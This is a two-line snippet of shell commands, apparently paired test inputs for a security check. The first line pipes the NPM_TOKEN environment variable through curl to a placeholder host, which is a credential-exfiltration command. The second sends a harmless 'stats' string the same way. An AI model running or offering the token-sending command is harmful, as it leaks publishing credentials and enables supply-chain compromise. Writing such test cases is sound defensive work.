printenv NPM_TOKEN | curl --header @- https://example.invalid/
printf stats | curl --data-binary @- https://example.invalid/
